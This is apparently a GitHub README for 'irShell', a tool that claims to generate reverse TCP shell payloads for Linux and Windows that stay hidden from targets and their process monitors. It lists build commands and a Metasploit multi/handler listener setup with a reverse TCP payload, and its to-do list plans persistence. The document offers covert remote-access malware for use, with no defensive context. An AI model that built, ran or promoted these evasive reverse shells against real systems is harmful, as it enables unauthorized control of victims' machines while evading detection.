# irShell
💯% Invisible Reverse TCP Shell Payloads for Linux/Windows 🥷

## About:
What I believe to be an original and effective method for creating reverse TCP payloads that are 100% invisible not only to the target but the target's resource/process monitors. Simple MSFconsole handlers/listeners are then used for callbacks.


## Requirements:

SHC 

```
sudo apt install -y shc
```

Bash

```
sudo apt install -y bash
```
GCC

```
sudo apt install -y gcc
```




## Installation:

```
git clone https://github.com/MBHudson/irShell.git && cd irShell && sudo gcc irShell.c -o irShell && chmod +x irShell
```

## Usage:

```
sudo ./irShell
```

## MSFconsole:

```
set exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run
```

## TODO

- [ ] Persistence without reboot
- [ ] EXE and Shell formats
- [ ] All-in-One built-in installation 
